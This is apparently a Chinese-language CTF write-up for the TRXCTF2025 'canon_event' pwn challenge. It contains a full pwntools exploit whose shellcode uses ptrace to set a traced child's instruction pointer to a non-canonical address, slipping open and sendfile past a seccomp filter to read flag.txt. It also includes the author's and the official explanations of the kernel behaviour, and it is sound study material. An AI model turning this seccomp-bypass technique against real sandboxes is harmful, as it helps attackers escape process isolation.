# TRXCTF2025




<!--more-->



## canon_event

> ptrace + 沙箱绕过
>

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *v3; // rbx
  void *v4; // rax
  void *v5; // r12
  unsigned int uint; // ebp

  v3 = mmap((void *)0xDEAD000, 0x1000u, 3, 50, -1, 0);
  v4 = mmap((void *)0xDEAE000, 0x1000u, 3, 50, -1, 0);
  if ( v3 == (void *)-1LL || (v5 = v4, v4 == (void *)-1LL) )
    err(1, "mmap failed");
  printf("code size: ");
  uint = get_uint();                            // 输入shellcode长度
  if ( uint > 0x1000 )                          // shellcode长度大于0x1000就报错
  {
    puts("invalid code size");
    exit(1);
  }
  printf("enter shellcode: ");
  if ( read(0, v3, uint) < 0 )                  // 读入shellcode
    err(1, "read failed");
  if ( mprotect(v3, 0x1000u, 5) < 0 )           
    err(1, "mprotect failed");
  isolate_and_jump((void (__fastcall *)(_QWORD, void *))v3, v5); //开sandbox，然后去执行shellcode
  return 0;
}
```



```shell
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer >> 32
 0001: 0x35 0x04 0x00 0x00008000  if (A >= 0x8000) goto 0006
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x02 0x00 0x0000003d  if (A == wait4) goto 0006
 0004: 0x15 0x01 0x00 0x00000065  if (A == ptrace) goto 0006
 0005: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
```

只允许三个系统调用：wait4、ptrace、fork



exp:

```python
#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./pwn")
context.terminal = ["tmux", "splitw", "-h"]
context.binary = exe

def dbg(r):
    gdb.attach(r)
    pause()

# DOCKER_PORT = 1337
# REMOTE_NC_CMD    = "nc localhost 444"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode child
set follow-exec-mode same
c
"""



def main():
    r = process("./pwn")

    PTRACE_CONT = 7
    PTRACE_GETREGS = 12
    PTRACE_SETREGS = 13
    PTRACE_SYSCALL = 24
    RIP_OFFSET = 8*16

    shellcode = asm(f"""
        mov eax, SYS_fork
        syscall
        test eax, eax
        jz child

        mov r13, rax
                    
        mov eax, SYS_wait4
        mov rdi, r13
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall
                                        
        mov eax, SYS_ptrace
        mov edi, {PTRACE_SYSCALL}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall
        
        mov eax, SYS_wait4
        mov rdi, r13
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall
                                        
        mov eax, SYS_ptrace
        mov edi, {PTRACE_GETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall

        mov rdi, 0x820000000000
        lea rbx, [rsp+{RIP_OFFSET}]
        mov [rbx], rdi
        mov eax, SYS_ptrace
        mov edi, {PTRACE_SETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall
                    
        mov eax, SYS_ptrace
        mov edi, {PTRACE_CONT}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall
                      
        mov eax, SYS_wait4
        mov rdi, r13
        mov rsi, rsp
        xor edx, edx
        xor r10, r10
        syscall
                                        
        mov eax, SYS_ptrace
        mov edi, {PTRACE_GETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall
                                                                                                     
        lea rdi, [rip+sendfile] 
        lea rbx, [rsp+{RIP_OFFSET}]
        mov [rbx], rdi
        mov eax, SYS_ptrace
        mov edi, {PTRACE_SETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall
       
        mov eax, SYS_ptrace
        mov edi, {PTRACE_SYSCALL}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall
                    
        mov eax, SYS_wait4
        mov rdi, r13
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall
                                        
        mov eax, SYS_ptrace
        mov edi, {PTRACE_GETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall
                 
        mov rdi, 0x820000000000
        lea rbx, [rsp+{RIP_OFFSET}]
        mov [rbx], rdi
        mov eax, SYS_ptrace
        mov edi, {PTRACE_SETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall
                    
        mov eax, SYS_ptrace
        mov edi, {PTRACE_CONT}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall
                    
        mov eax, SYS_wait4
        mov rdi, r13
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall
        
        hlt

        child:
            mov eax, SYS_ptrace
            xor edi, edi
            xor esi, esi
            xor edx, edx
            xor r10, r10
            syscall
            int3
        open:
            mov eax, SYS_open
            lea rdi, [rip+flag]
            xor esi, esi
            xor edx, edx    
            syscall
        sendfile:
            mov rax, SYS_sendfile
            mov rdi, 1
            mov rsi, 3  
            xor edx, edx
            mov r10, 0x50
            syscall
        hlt
    flag:
    """) + b"flag.txt\0"
    dbg(r)
    r.sendline(bstr(len(shellcode)))
    r.send(shellcode)

    r.interactive()

if __name__ == "__main__":
    main()
```



shellcode解释：

```
SYS_fork

parent_process:
	wait4  //等待TRACEME
	
	PTRACE_SYSCALL //捕获下一次syscall信号，即open的syscall
	wait4	//等待open的syscall开始
	PTRACE_GETREGS	//获取寄存器信息
	set_rip_non_canoncial_address	//设置RIP为非法地址来绕过沙箱,然后执行syscall
	PTRACE_CONT	//继续执行
	wait4	//handle SIGSEV signal
	
	PTRACE_GETREGS //获取寄存器信息
	set_rip_sendfile //设置rip为sendfile处
	
	PTRACE_SYSCALL //捕获下一次syscall,即sendfile的syscall
	wait4	//等待sendfile的syscall开始
	PTRACE_GETREGS	//获取寄存器信息
	set_rip_non_cononcial_addr	//设置RIP为非法地址来绕过沙箱,然后执行syscall
	PTRACE_CONT	//继续执行
	wait4	//handle SIGSEV signal
	
child_process:
	PTRACE_TRACEME
	open
	sendfile
```



**沙箱不是禁掉了open和sendfile吗？为什么还能用？**

> 先附上官方WP的一些解释：
>
> 
>
> **Understanding the seccomp filter**
>
> Extracting the **`seccomp`** filter from the binary using **`seccomp-tools`** will give you the following result:
>
> ```c
> line  CODE  JT   JF      K
> =================================
> 0000: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer >> 32
> 0001: 0x35 0x04 0x00 0x00008000  if (A >= 0x8000) goto 0006
> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
> 0003: 0x15 0x02 0x00 0x0000003d  if (A == wait4) goto 0006
> 0004: 0x15 0x01 0x00 0x00000065  if (A == ptrace) goto 0006
> 0005: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0007
> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
> 0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
> ```
>
> The filter allows three syscalls in the standard canonical range of userland addresses (so **`rip`** has to be lower than **`0x800000000000`**). If the **instruction pointer** is not in that range then you can call any syscall you want!
>
> 
>
> **ptrace & wait4**
>
> The objective is to bypass the check on the instruction pointer using **`ptrace`.**
>
> **`ptrace`** enables a process (called the “tracer”) to debug another process (usually a child process called “tracee”).
>
> By using **`PTRACE_SYSCALL`** we tell the tracee to pause execution before executing **`syscall`**. The tracee will send a **`SIGTRAP`** signal when it encounters a syscall so in the tracer we can just wait for the signal with **`wait4`.** At this point we can modify the tracee’s registers using **`PTRACE_SETREGS`.**
>
> With this type of ptrace request we can modify all registers, **including rip!**
>
> 
>
> **Imaginary conversation with an imaginary pwner**
>
> *“But wait! If we change **`rip`** we would not execute the **`syscall`** instruction anymore!”*
>
> Well… actually **`syscall`** will be executed anyways because the instruction is fetched before ptrace takes place!
>
> *”Ok but seccomp acts before **`ptrace`**… right?”*
>
> Nope lol. The seccomp filter is applied only after **`ptrace`** since **`Linux 4.8`** on. From **`Linux 3.5`** to **`Linux 4.7`** the filter was applied before **`ptrace`** so it was even worst!
>
> 
>
> **Consequences**
>
> We can effectively change **`rip`** just before a syscall is executed and before the seccomp filter is applied to a non canonical address. This will execute the syscall correctly but with a fake, non canonical **`rip`** bypassing the seccomp filter!
>
> After the syscall the tracee will send a **`SIGSEV`** signal (because of the non canonical **`rip`**) but this can be easily be handled by the tracer with a **`wait4`** and a **`PTRACE_SETREGS`** and resetting **`rip`** to the right address.
>
> 
>
> **Wrapping it up**
>
> Now that we understood how to bypass the filter we can just call **`execve`** right? Well no. When calling **`execve("/bin/sh", NULL, NULL)`** the syscall will replace the current process with a new process (in this case **`/bin/sh`** ). The new process will inherit the seccomp filter of the old process. When the spawned process will try to execute other syscalls (like **`open,`** **`read`,** **`sbrk`** and so on) the filter will block these syscalls. This is not really a problem, I can just call **`open`** and **`sendfile`** and the job is done!



感觉官方WP讲的不是很清晰，我就去看了相关内核代码：

[处理ptrace和seccomp的函数](https://github.com/torvalds/linux/blob/6e64f4580381e32c06ee146ca807c555b8f73e24/kernel/entry/syscall-common.c#L20)：这里可以看出，执行顺序：ptrace、seccomp、syscall，而我们在ptrace的时候设置RIP为非法地址，沙箱直接就allow了，不会再去检查sys_number的内容，也就可以去执行read这些系统调用了



**其他相关资料：**

https://github.com/torvalds/linux/commit/93e35efb8de45393cf61ed07f7b407629bf698ea



## Virtual_Insanity

> 栈溢出+利用vsyscall

就不写了。。。


---

> Author: J4f  
> URL: http://localhost:1313/posts/trxctf2025/  

